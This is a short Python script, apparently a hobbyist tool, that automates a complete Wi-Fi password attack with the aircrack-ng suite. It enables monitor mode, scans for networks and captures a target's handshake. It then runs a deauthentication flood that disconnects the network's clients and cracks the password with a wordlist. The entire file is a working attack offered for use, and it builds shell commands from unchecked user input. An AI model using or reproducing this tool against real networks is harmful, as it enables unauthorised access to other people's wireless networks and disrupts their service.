import os
import time
import subprocess


class WifiHack():
    def __init__(self):
        self.getting_adapter = None
        self.bssid = None
        self.savefile = None

    def enable_monitor_mode(self):
        interfaces = os.popen('ls /sys/class/net/').read().strip()
        print("Available network interfaces:", "\n" + interfaces)
        adapter = str(input("Enter the interface to activate monitor mode : "))
        cmd = f'airmon-ng start {adapter}'
        a_monitor = os.popen(cmd).read()
        print(a_monitor + "\n")
        time.sleep(3)

    def scanning_networks(self):
        cmd = f'iwconfig | grep "Mode:Monitor"'
        adapter = os.popen(cmd).read()
        print(adapter)
        self.getting_adapter = str(input("\n" + "Enter the adapter that is in monitor mode: "))
        first_command = f'airodump-ng {self.getting_adapter}'
        subprocess.Popen(["x-terminal-emulator", "-e", f"bash -c '{first_command}; exec bash'"])

    def capture_handshake(self):
        print("")
        self.bssid = str(input("From the open terminal, enter the BSSID of the network you want to crack : "))
        channel = str(input("Enter the channel of the BSSID network (ch):"))
        self.savefile = str(input("\n" + "Provide a unique output capture file name that hasn't been used before : "))
        cmd = f'airodump-ng --bssid {self.bssid} -c {channel} --write {self.savefile} {self.getting_adapter}'
        subprocess.Popen(["x-terminal-emulator", "-e", f"bash -c '{cmd}; exec bash'"])

    def deauth_attack(self):
        d_cmd = f'aireplay-ng --deauth 90 -a {self.bssid} {self.getting_adapter}'
        deauth_d = subprocess.Popen(["x-terminal-emulator", "-e", f"bash -c '{d_cmd}; exec bash'"])
        time.sleep(40)
        wordlist = str(input("\n" + "Enter the wordlist to crack the password: : "))
        p_cmd = f'aircrack-ng -w {wordlist} -b {self.bssid} {self.savefile}-01.cap'
        print(subprocess.Popen(["x-terminal-emulator", "-e", f"bash -c '{p_cmd}; exec bash'"]))

    def disable_monitor_mode(self):
        print("\n" + "Exiting monitor mode...")
        cmd = f'airmon-ng stop {self.getting_adapter}'
        a_monitor = os.popen(cmd).read()
        print("exited" + a_monitor)


hack_tool = WifiHack()
hack_tool.enable_monitor_mode()
hack_tool.scanning_networks()
hack_tool.capture_handshake()
hack_tool.deauth_attack()
hack_tool.disable_monitor_mode()
